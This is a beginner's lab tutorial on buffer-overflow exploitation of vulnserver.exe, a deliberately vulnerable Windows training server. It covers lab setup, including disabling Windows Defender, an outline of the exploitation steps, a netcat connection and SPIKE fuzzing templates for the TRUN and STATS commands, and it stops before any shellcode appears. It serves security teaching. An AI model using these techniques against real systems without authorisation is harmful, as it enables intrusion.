# A simple walkthrough for a windows vulnerable server (vulnserver.exe)

This tutorial is based on the "Practical Ethical Hacking - The Complete Course", a Udemy course made by Mr. Heath Adams (The Cyber Mentor)

# Requirements
- Download and install: Kali (for attacker machine) and windows 10 (victim's machine)
- Immunity Debugger: https://www.immunityinc.com/products/debugger/
- Vulnserver: http://www.thegreycorner.com/p/vulnserver.html

# Things to remember:
1. Make sure you disable the Windows Defender in Windows VM.
2. Allow files and printer sharing in your firewall (make sure you can ping windows VM from your Kali VM).
3. Always run Immunity Debugger (IMD) and Vulnserver.exe as Administrator.
4. Close and re-run Immunity Debugger and Vulnserver.exe after an attack from Kali machine to prevent issues.

# Steps to conduct bufferoverflow
1. Spiking 
2. Fuzzing  
3. Find the Offset
4. Overwriting the EIP
5. Finding Bad Characters
6. Finding Right Modules (MSF)
7. Generating shellcode (MSF)
8. Root!

## I. Spiking
1. On windows, open vulnserver.exe (always run as administrator)
2. On Kali VM, try to test if Kali can connect to Windows via netcat. Usuallly, vulnserver runs on port 9999.
```
$ nc -nv 192.168.17.134 9999
```
This will be the result if you type HELP

![vulnserver demo](/img/HELP_command.png)

Notes:
> We can use these command to test if the target is vulnerable to bufferoverflow. 
> We will try use STATS but **spoiler alert, TRUN is the correct payload for this exercise.

3. We will create files with payload and try if the target machine is vulnerable to bufferoverflow. Create a filed called '[stats.spk](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/stats.spk)' and ‘[trun.spk](https://github.com/slythx/bufferoverflow/blob/master/vulnserver/trun.spk)’

stats.spk

````spk
s_readline();
s_string("STATS ");
s_string_variable("0");
````
trun.spk

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```
4. Open IMD as administrator, click File > Attach > select vulnserver > click Attach > click the run icon ![vulnserver icon](/img/IMD_run_icon.png)







